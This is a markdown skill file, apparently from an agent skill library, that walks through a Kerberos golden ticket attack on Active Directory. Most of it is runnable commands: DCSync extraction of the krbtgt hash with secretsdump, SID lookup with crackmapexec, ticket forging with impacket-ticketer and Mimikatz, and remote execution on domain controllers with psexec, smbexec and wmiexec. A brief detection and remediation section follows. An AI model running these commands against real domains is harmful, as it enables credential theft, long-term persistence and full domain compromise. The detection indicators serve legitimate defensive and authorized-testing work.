<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-golden-ticket-attacks
description: >-
  Forge Kerberos TGTs using compromised krbtgt hash for persistent domain access.
  Execute golden ticket attacks with Impacket ticketer and Mimikatz, and detect
  golden ticket usage through Kerberos anomaly detection.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - golden-ticket
  - kerberos
  - persistence
  - krbtgt
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1558.001"]
  frameworks: ["MITRE ATT&CK"]
  tools: ["impacket", "mimikatz", "rubeus"]
---

# Performing Golden Ticket Attacks

## Overview

A golden ticket is a forged Kerberos TGT created using the krbtgt account hash.
It provides unrestricted access to any resource in the domain for the ticket
lifetime. Golden tickets survive password resets for all accounts except krbtgt
and persist until krbtgt is rotated twice (current + previous key).

## Prerequisites

- Tools: `impacket` (ticketer, secretsdump), `mimikatz`
- krbtgt NTLM hash (obtained via DCSync or NTDS.dit extraction)
- Domain SID (`S-1-5-21-...`)

## Workflow

### Step 1: Obtain krbtgt Hash

```bash
# DCSync krbtgt hash
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:'P@ssw0rd'@10.0.0.1

# Extract domain SID
crackmapexec ldap 10.0.0.1 -u admin -p 'P@ssw0rd' -d corp.local --get-sid
```

### Step 2: Forge Golden Ticket

```bash
# Impacket ticketer — create golden ticket
impacket-ticketer -nthash <krbtgt_nthash> \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local -duration 3650 Administrator

# Use the forged ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local

# Mimikatz golden ticket
# kerberos::golden /user:Administrator /domain:corp.local \
#   /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

### Step 3: Validate Access

```bash
# Access domain controller with golden ticket
impacket-smbexec -k -no-pass dc01.corp.local
impacket-wmiexec -k -no-pass dc01.corp.local

# Access any service in the domain
impacket-mssqlclient -k -no-pass sql01.corp.local

python3 scripts/agent.py validate --domain corp.local --dc-ip 10.0.0.1
```

## Verification

- [ ] krbtgt hash obtained through authorized testing
- [ ] Golden ticket forged with correct domain SID
- [ ] Domain-wide access verified with forged ticket
- [ ] Detection rules validated for golden ticket indicators
- [ ] Remediation: rotate krbtgt twice with appropriate interval

## Detection Opportunities

- TGS requests without prior AS exchange (no Event 4768 before 4769)
- TGT with anomalous lifetime exceeding domain policy
- Event 4769 with ticket encryption mismatch (RC4 when AES expected)
- Account field mismatch between TGT and requesting principal
- Sigma rule: `win_security_golden_ticket_usage`

## References

- [Impacket ticketer](https://github.com/fortra/impacket/blob/main/examples/ticketer.py)
- [ADSecurity — Golden Tickets](https://adsecurity.org/?p=1640)
- [CERT-EU — Kerberos Golden Ticket Protection](https://cert.europa.eu/publications/security-advisories/2014-009/pdf)
